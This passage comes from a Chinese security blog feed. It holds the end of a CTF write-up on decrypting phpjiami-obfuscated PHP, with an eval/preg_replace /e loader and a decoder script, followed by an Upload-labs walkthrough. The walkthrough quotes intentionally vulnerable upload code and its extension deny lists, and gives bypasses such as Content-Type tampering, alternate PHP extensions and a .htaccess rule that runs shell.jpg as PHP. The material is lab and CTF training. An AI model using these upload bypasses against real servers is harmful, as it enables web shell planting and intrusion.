class="line"><span class="variable">$v3</span> = <span class="title function_ invoke__">func3</span>($&#123;<span class="variable">$v2</span>&#125;);</span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="title function_ invoke__">dirname</span>($&#123;<span class="variable">$v2</span>&#125;));</span><br><span class="line"><span class="comment">// $v4 = $_v9($v3);</span></span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="comment">// $v5 = func4(&#x27;??????&#x27;);</span></span><br><span class="line"><span class="comment">// 解密之后的原文不是 $v4，这里是翻译之后的</span></span><br><span class="line"><span class="variable">$v5</span> = <span class="string">&#x27;eval(base64_decode($v4));&#x27;</span>;</span><br><span class="line"><span class="comment">// $v5 = $_v8(func4(&#x27;??????&#x27;), $v5, func4(&#x27;??????&#x27;));</span></span><br><span class="line"><span class="comment">// mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span></span><br><span class="line"><span class="comment">// PCRE 修饰符 e (PREG_REPLACE_EVAL)</span></span><br><span class="line"><span class="comment">// Warning: This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.</span></span><br><span class="line"><span class="comment">// If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences.</span></span><br><span class="line"><span class="comment">// 换句话说 preg_replace 如果带 e 的话，第一步，正常地进行正则表达式替换（反向引用也会被正常替换，就是完全正常的正则替换），第二步，把结果 eval 作为最终结果</span></span><br><span class="line"><span class="comment">// 简而言之 $v5 = eval($v5);</span></span><br><span class="line"><span class="variable">$v5</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/0dcaf9/e&#x27;</span>, <span class="variable">$v5</span>, <span class="string">&#x27;0dcaf9&#x27;</span>);</span><br><span class="line"><span class="comment">// 把上述几步统一一下 $v5 = eval(func3($_f_));</span></span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="title function_ invoke__">dirname</span>($&#123;<span class="variable">$v2</span>&#125;));</span><br><span class="line"><span class="comment">// 把解码之后的文件运行结果返回</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$v5</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data_1</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ch</span> &lt; <span class="number">245</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ch</span> &gt; <span class="number">136</span>) &#123;</span><br><span class="line">                <span class="variable">$data_1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ch</span> / <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$data_1</span> .= <span class="variable">$data</span>[<span class="variable">$i</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data_1</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data_1</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$j</span> = <span class="variable">$ctrmax</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$data_2</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data_1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$j</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$j</span> = <span class="variable">$ctrmax</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$j</span>--;</span><br><span class="line">        <span class="variable">$data_2</span> .=  <span class="variable">$data_1</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$j</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data_2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_data</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$code_end</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$code</span>, <span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$code_end</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data_start</span> = <span class="variable">$code_end</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="variable">$data_start</span>, -<span class="number">46</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_key</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $v1 = $v2(&#x27;bWQ1&#x27;);</span></span><br><span class="line">    <span class="comment">// $key1 = $v1(&#x27;??????&#x27;);</span></span><br><span class="line">    <span class="variable">$pos1</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$code</span>, <span class="string">&quot;(&#x27;&quot;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;md5&#x27;</span>)) . <span class="string">&quot;&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$pos2</span> = <span class="title function_ invoke__">strrpos</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="number">0</span>, <span class="variable">$pos1</span>), <span class="string">&#x27;$&#x27;</span>);</span><br><span class="line">    <span class="variable">$pos3</span> = <span class="title function_ invoke__">strrpos</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="number">0</span>, <span class="variable">$pos2</span>), <span class="string">&#x27;$&#x27;</span>);</span><br><span class="line">    <span class="variable">$var_name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="variable">$pos3</span>, <span class="variable">$pos2</span> - <span class="variable">$pos3</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$pos4</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$code</span>, <span class="variable">$var_name</span>, <span class="variable">$pos1</span>);</span><br><span class="line">    <span class="variable">$pos5</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$code</span>, <span class="string">&quot;(&#x27;&quot;</span>, <span class="variable">$pos4</span>);</span><br><span class="line">    <span class="variable">$pos6</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$code</span>, <span class="string">&quot;&#x27;)&quot;</span>, <span class="variable">$pos4</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="variable">$pos5</span> + <span class="number">2</span>, <span class="variable">$pos6</span> - <span class="variable">$pos5</span> - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$input_file</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$output_file</span> = <span class="variable">$argv</span>[<span class="number">1</span>] . <span class="string">&#x27;.decrypted.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$input_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">find_data</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$code</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;未找到加密数据&#x27;</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">find_key</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;未找到秘钥&#x27;</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$decrypted</span> = <span class="title function_ invoke__">decrypt</span>(<span class="variable">$data</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$uncompressed</span> = <span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$decrypted</span>);</span><br><span class="line"><span class="comment">// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$uncompressed</span>) &#123;</span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$uncompressed</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$decrypted</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$output_file</span>, <span class="variable">$decrypted</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;解密后文件已写入到 &#x27;</span>, <span class="variable">$output_file</span>, PHP_EOL;</span><br></pre></td></tr></table></figure></div>

<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>没什么好说的，<code>index.php</code> 提示存在 <code>UploadFile.class.php</code>，下载下来之后，发现关键函数，然后数组绕过就vans了</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"> <span class="comment">// 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞</span></span><br><span class="line">    <span class="variable">$origin_name</span> = <span class="title function_ invoke__">current</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$new_name</span> = (<span class="variable language_">$this</span>-&gt;new_name ? <span class="variable language_">$this</span>-&gt;new_name : <span class="variable">$origin_name</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">    <span class="variable">$target_fullpath</span> = <span class="variable language_">$this</span>-&gt;dist_path . DIRECTORY_SEPARATOR . <span class="variable">$new_name</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.virzz.com/2017/09/20/pwnhub_writeups_sha_fu_fu_workdays.html">Virink师傅的题解</a><br><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html">p神的出题原理</a><br><a href="http://lovei.org/archives/pwnhub6669.html">腹黑师傅的wp</a><br><a href="https://www.52pojie.cn/thread-693641-1-1.html">Ganlv 师傅的解码思路</a><br><a href="https://www.colabug.com/2018/0209/2334241/">某PHP加密文件解密过程初探</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-labs 20关wp</title>
    <url>/yakko117/2019/03/24/upload_labs20/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。<br>项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
<h2 id="Pass-01-js-audit"><a href="#Pass-01-js-audit" class="headerlink" title="Pass-01 js audit"></a>Pass-01 js audit</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">javascript</div></div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>直接在js上添加php 或者burp改包就好了</p>
<hr>
<h2 id="Pass-02-只验证Content-type"><a href="#Pass-02-只验证Content-type" class="headerlink" title="Pass-02 只验证Content-type"></a>Pass-02 只验证Content-type</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>抓包改Content-Type即可。</p>
<hr>
<h2 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>不允许上传 <code>.asp</code>, <code>.aspx</code>, <code>.php</code>, <code>.jsp</code>后缀文件，但可以上传其他的后缀</p>
<blockquote>
<p> .phtml .phps .php5 .pht</p>
</blockquote>
<p>前提是 <code>apache</code> 的 <code>httpd.conf</code> 中有如下配置代码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure></div>
<p>或者上传 <code>.htaccess</code> 文件<br>但是需要 1. <code>mod_rewrite</code> 开启；2. <code>AllowOverride All</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>
<p>此时上传的 <code>shell.jpg</code> 会被解析成 <code>php</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6d312j313w0hdn05.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t6d312j313w0hdn05.jpg" class="lazyload"></a><br>或者直接添加</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure></div>
<p>基本上所有的黑名单都可以用Apache解析漏洞绕过。<br>(这道题我卡了一段时间，后来改了php配置，改成5.4.45版本就能跑 orz)</p>
<hr>
<h2 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04 .htaccess绕过"></a>Pass-04 .htaccess绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>基本上过滤了各种后缀<br>照搬上面的方法用 <code>.htaccess</code> 后缀可以绕过。</p>
<hr>
<h2 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span 